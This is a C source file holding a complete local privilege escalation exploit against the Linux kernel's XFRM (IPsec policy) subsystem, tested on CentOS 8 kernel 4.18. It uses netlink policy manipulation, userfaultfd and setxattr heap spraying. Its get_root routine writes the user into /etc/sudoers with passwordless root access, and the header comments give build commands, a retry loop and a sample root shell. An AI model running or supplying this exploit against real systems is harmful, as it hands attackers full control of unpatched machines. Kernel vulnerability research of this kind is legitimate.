/*
 * Original binary file: https://github.com/duasynt/xfrm_poc/blob/master/lucky0
 * This poc is written by Vitaly Nikolenko @vnik5287
 *
 * Tested on CentOS8 4.18.0-80.11.2.el8_0.x86_64
 *	[test@localhost Desktop]$ gcc lucky0_RE.c -lpthread
 *
 *	[test@localhost Desktop]$ while true; do ./a.out && break; done
 *	[-] failed
 *	[-] failed
 *	[-] failed
 *	running get_root
 *	[+] current user test was added to /etc/sudoers
 *	[+] get_root done
 *
 *	[test@localhost Desktop]$ sudo su
 *	[root@localhost Desktop]# id
 *	uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 *
 *	[root@localhost Desktop]# uname -a
 *	Linux localhost.localdomain 4.18.0-80.11.2.el8_0.x86_64 #1 SMP Tue Sep 24 11:32:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 *
 *	[root@localhost Desktop]# cat /etc/redhat-release
 *	CentOS Linux release 8.1.1911 (Core)
 *	[root@localhost Desktop]#
 *
 * Compile:
 *	gcc lucky0_RE.c -lpthread
 *
 * Execute:
 *	while true; do ./a.out && break; done
 */

#define	_GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/xfrm.h>
#include <linux/nsfs.h>
#include <linux/netlink.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <linux/pfkeyv2.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/userfaultfd.h>
#include <pwd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/poll.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>


#define MAX_PAYLOAD	512

#define	SUBP_MAX	2000
#define	SEM_MAX		300

int wait_for_bug[2];
int wait_for_pol0[2];
int pipedes2[2];

int pid[SUBP_MAX];
sem_t *shmaddr;
int global_6031cc;


int bind_on_cpu(int num)
{
	cpu_set_t cpu;
	CPU_ZERO(&cpu);
	CPU_SET(num, &cpu);
	if (sched_setaffinity(syscall(SYS_gettid), sizeof(cpu), &cpu) == -1) {
		perror("sched_setaffinity");
		return -1;
	}

	CPU_ZERO(&cpu);
	if (sched_getaffinity(syscall(SYS_gettid), sizeof(cpu), &cpu) == -1) {
		perror("sched_getaffinity");
		return -1;
	}

	if (!CPU_ISSET(num, &cpu))
		return -1;

	return 0;
}



static void __xfrm_hash_rebuild(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd == -1) {
		perror("socket");
		return;
	}

	struct msghdr mh;	/* 0x38 */
	int len = sizeof(struct nlmsghdr);
	int padding = NLMSG_ALIGN(sizeof(int));
	len += padding;
	len += sizeof(struct nlattr);
	len += sizeof(struct xfrmu_spdhthresh);
	char buf[len];
	struct iovec iov;
	memset(&mh, 0, sizeof(mh));
	memset(buf, 0, len);
	memset(&iov, 0, sizeof(iov));

	struct nlmsghdr *d0;
	d0 = (struct nlmsghdr *)&buf[0];
	struct nlattr *d1;
	d1 = (struct nlattr *)(buf + sizeof(*d0) + padding);
	struct xfrmu_spdhthresh *d2;
	d2 = (struct xfrmu_spdhthresh *)(buf + sizeof(*d0) +
					padding + sizeof(*d1));

	iov.iov_base = (void *)buf;
	iov.iov_len = len;

	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	d0->nlmsg_len = len;
	d0->nlmsg_type = XFRM_MSG_NEWSPDINFO; 
	d0->nlmsg_flags = NLM_F_REQUEST | NLM_F_MULTI;
	d0->nlmsg_seq = 0;
	d0->nlmsg_pid = 0;
	d1->nla_len = sizeof(*d1) + sizeof(*d2);
	d1->nla_type = XFRMA_SPD_IPV4_HTHRESH;
	d2->rbits = 1;

	sendmsg(fd, &mh, 0);
	return;
}

static void __xfrm_flush_policy0(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd == -1) {
		perror("socket");
		return;
	}

	struct msghdr mh;
	struct iovec iov;
	struct nlmsghdr nlm;
	memset(&mh, 0, sizeof(mh));
	memset(&iov, 0, sizeof(iov));
	memset(&nlm, 0, sizeof(nlm));

	iov.iov_base = (void *)&nlm;
	iov.iov_len = sizeof(nlm);

	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	nlm.nlmsg_len = sizeof(nlm);
	nlm.nlmsg_type = XFRM_MSG_FLUSHPOLICY;
	nlm.nlmsg_flags = 1;
	nlm.nlmsg_seq = 0;
	nlm.nlmsg_pid = 0;

	sendmsg(fd, &mh, 0);
	return;
}

static void __xfrm_add_policy0(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd == -1) {
		perror("socket");
		return;
	}

	struct msghdr mh;
	struct iovec iov;
	int len = sizeof(struct nlmsghdr);
	len += sizeof(struct xfrm_userpolicy_info);
	char buf[len];
	memset(&mh, 0, sizeof(mh));
	memset(&iov, 0, sizeof(iov));
	memset(buf, 0, len);

	struct nlmsghdr *d0;
	d0 = (struct nlmsghdr *)buf;
	struct xfrm_userpolicy_info *d1;
	d1 = (struct xfrm_userpolicy_info *)(buf + sizeof(*d0));

	iov.iov_base = (void *)buf;
	iov.iov_len = len;

	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	d0->nlmsg_len = len;
	d0->nlmsg_type = XFRM_MSG_NEWPOLICY; 
	d0->nlmsg_flags = NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL;
	/* former value was 0x301 but it also works with these
	 * flags that give 0x601. No coherent flags give 0x301
	 * as 0x100 and 0x200 are contradictory
	*/
	
	d0->nlmsg_seq = 0;
	d0->nlmsg_pid = 0;
	
	d1->sel.saddr.a6[0] = 0x80fe;
	d1->sel.saddr.a6[1] = 0;
	d1->sel.saddr.a6[2] = 0;
	d1->sel.saddr.a6[3] = 0xAA000000;
	
	d1->sel.family = AF_INET6;

	sendmsg(fd, &mh, 0);
	return;
}

static void __xfrm_add_policy1(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd == -1) {
		perror("socket");
		return;
	}

	struct msghdr mh;
	struct iovec iov;
	int len = sizeof(struct nlmsghdr);
	len += sizeof(struct xfrm_userpolicy_info);
	char buf[len];
	memset(&mh, 0, sizeof(mh));
	memset(&iov, 0, sizeof(iov));
	memset(buf, 0, len);

	struct nlmsghdr *d0;
	d0 = (struct nlmsghdr *)buf;
	struct xfrm_userpolicy_info *d1;
	d1 = (struct xfrm_userpolicy_info *)(buf + sizeof(*d0));

	iov.iov_base = (void *)buf;
	iov.iov_len = len;

	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	d0->nlmsg_len = len;
	d0->nlmsg_type = XFRM_MSG_UPDPOLICY; 
	d0->nlmsg_flags = NLM_F_REQUEST; 

	d1->sel.family = AF_INET6;
	
	d1->lft.soft_add_expires_seconds = 7;
	d1->lft.hard_add_expires_seconds = 7;
	d1->priority = 1;
	d1->index = 0x6e6bbc;
	d1->action = 1;
	d1->flags = XFRM_POLICY_BLOCK; 

	sendmsg(fd, &mh, 0);
	return;
}

static void get_root(void)
{
	fprintf(stderr, "running get_root\n");
	struct passwd *p;
	p = getpwuid(getuid());
	if (!p) {
		perror("getpwuid");
		exit(-1);
	}

	char str[256];
	sprintf(str, "%s\tALL=(ALL) \tNOPASSWD: ALL\n", p->pw_name);

	chmod("/etc/sudoers", S_IRUSR|S_IWUSR|S_IRGRP); 
	int fd = open("/etc/sudoers", S_ISGID|S_IXOTH); 
	if (fd == -1) {
		perror("sudoers");
		exit(-1);
	}

	write(fd, str, strlen(str));
	chmod("/etc/sudoers", S_IRUSR|S_IRGRP); 
	printf("[+] current user %s was added to /etc/sudoers\n", p->pw_name);
}

struct uffd_spray_data {
	int fd;
	int idx;
};

static void *uffd_spray_handler(void *arg)
{
	struct uffd_spray_data *o;
	o = (struct uffd_spray_data *)arg;

	struct pollfd pollfd;
	struct uffd_msg msg;
	ssize_t nr = -1;
	int fd = o->fd;
	int idx = o->idx;

	pollfd.fd = fd;
	pollfd.events = POLLIN;

	while (1) {
		int ready;
		int readc = 0;

		ready = poll(&pollfd, 1, -1);

		if (pollfd.revents & POLLERR)
			continue;

		if (!(pollfd.revents & POLLIN))
			continue;

		readc = read(fd, &msg, 0x20);
		if (readc == -1) {
			perror("read userfaultfd");
		}
		if (readc != 0x20)
			exit(1);

		void *addr;
		addr = (void *)(msg.arg.pagefault.address & 0xfffffffffffff000);
		sem_post(&shmaddr[idx + 1]);
		int c;
		read(wait_for_bug[0], &c, 1);

		struct uffdio_copy io_copy;
		char src[0x1000];
		io_copy.dst = (unsigned long)addr;
		io_copy.src = (unsigned long)src;
		io_copy.len = 0x1000;
		io_copy.mode = 0;
		if ((idx > (SEM_MAX - 1)) || (idx < 205)) {
			sleep(1);
			if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0)
				perror("UFFDIO_COPY");
		} else if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0) {
			perror("UFFDIO_COPY");
		}
		sleep(3);
		break;
	}

	return (void *)0;
}

static pthread_t uffd_setup(void *addr, unsigned long len,
				long flag, int idx)
{
	int err;
	int uffd;
	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (uffd == -1) {
		perror("userfaultfd");
		exit(-1);
	}

	struct uffdio_api io_api;
	io_api.api = UFFD_API;
	io_api.features = 0;
	err = ioctl(uffd, UFFDIO_API, &io_api);
	if (err == -1) {
		perror("UFFD_API");
		exit(-1);
	}
	if (io_api.api != UFFD_API) {
		fprintf(stderr, "UFFD_API error\n");
		exit(-1);
	}

	struct uffdio_register io_reg;
	io_reg.range.start = (unsigned long)addr;
	io_reg.range.len = len;
	io_reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	err = ioctl(uffd, UFFDIO_REGISTER, &io_reg);
	if (err == -1) {
		perror("ioctl UFFDIO_REGISTER");
		exit(-1);
	}

	if ((io_reg.ioctls & 0x1c) != 0x1c) {
		fprintf(stderr, "ioctl set is incorrent\n");
		exit(-1);
	}

	struct uffd_spray_data *b;
	b = (struct uffd_spray_data *)malloc(8);
	b->fd = uffd;
	b->idx = idx;

	pthread_t ret;
	pthread_create(&ret, NULL, uffd_spray_handler, (void *)b);
	return ret;
}

static pthread_t spray_setxattr(int flag, int idx)
{
	pthread_t ret;
	void *addr;
	addr = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|0x20, -1, 0); /* TODO */
	if (!addr) {
		perror("mmap");
		exit(-1);
	}

	ret = uffd_setup(addr, 0x1000, flag, idx);
	sem_wait(&shmaddr[idx]);
	if (flag) {
		int c;
		read(wait_for_pol0[0], &c, 1);
	}
	setxattr("/etc/passwd", "user.test", addr, 0x400, XATTR_CREATE); 
	return ret;
}

/*
 * the original program use these to get userns
 *	open("/proc/self/ns/pid", 0);
 *	ioctl(fd, NS_GET_USERNS);
 */
int main(int argc, char *argv[])
{
	key_t key;
	int shmid;
	int orig_gid;
	int stat_loc;

	int fd;
	fd = open("/proc/self/ns/pid", O_RDONLY);
	if (fd == -1) {
		perror("open");
		return -1;
	}

	int err;
	err = ioctl(fd, NS_GET_USERNS); /* identified with strace */
	if (err < 0) {
		global_6031cc = 1;
	}

	bind_on_cpu(0);

	key = ftok("/dev/null", 5);
	shmid = shmget(key, 0x25a0, IPC_CREAT|0644); 
	if (shmid < 0) {
		perror("shmget");
		exit(-1);
	}

	shmaddr = (sem_t *)shmat(shmid, 0, 0);

	for (int i = 0; i < SEM_MAX; i++) {
		sem_init(&shmaddr[i], 1, 0);
	}

	pipe(wait_for_bug);
	pipe(wait_for_pol0);
	pipe(pipedes2);

	orig_gid = getgid();

	for (int i = 0; i < SUBP_MAX; i++) {
		pid[i] = fork();
		if (pid[i])
			continue;
		/* child process */
		close(wait_for_bug[1]);
		close(wait_for_pol0[1]);
		close(pipedes2[1]);

		int tmpfd;
		tmpfd = open("/proc/self/ns/pid", O_RDONLY);
		if (tmpfd == -1) {
			perror("open");
		}

		if ((i > 0xf9) && (i < SEM_MAX)) {
			spray_setxattr(1, i);
			sleep(5);
			exit(0);
		} else if (i <= 0xf9) {
			spray_setxattr(0, i);
			sleep(5);
			exit(0);
		}

		sleep(8);
		if (setgid(orig_gid) < 0) {
			perror("setgid");
			exit(0);
		}

		sleep(5);
		if (!global_6031cc) {
			if (ioctl(tmpfd, NS_GET_USERNS) < 0) {
				alarm(0);
				exit(2);
			}
		}

		if (!seteuid(0)) {
			setegid(0);
			get_root();
			exit(1);
		}
		exit(0);
	}
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == -1) {
		perror("unshare");
		exit(-1);
	}

	sleep(2);
	sem_post(&shmaddr[0]);
	sleep(2);

	__xfrm_add_policy0();

	close(wait_for_pol0[0]);
	close(wait_for_pol0[1]);

	sleep(1);
	__xfrm_add_policy1();
	__xfrm_hash_rebuild();
	sleep(1); /* wait for xfrm_hash_rebuild() finish */

	__xfrm_flush_policy0();

	close(wait_for_bug[0]);
	close(wait_for_bug[1]);

	int status = -1;
	for (int i = 0; i < SUBP_MAX; i++) {
		waitpid(pid[i], &stat_loc, 0);
		if (WEXITSTATUS(stat_loc) == 1) {
			status = 0;
		} else if (WEXITSTATUS(stat_loc) == 2) {
			if (status)
				status = -2;
		}
	}
	shmctl(shmid, 0, 0);
	shmdt(shmaddr);
	if (status == -1) {
		fprintf(stderr, "[-] failed\n");
	} else if (!status) {
		fprintf(stderr, "[+] get_root done\n");
	}
	sleep(2);
	exit(status);
}

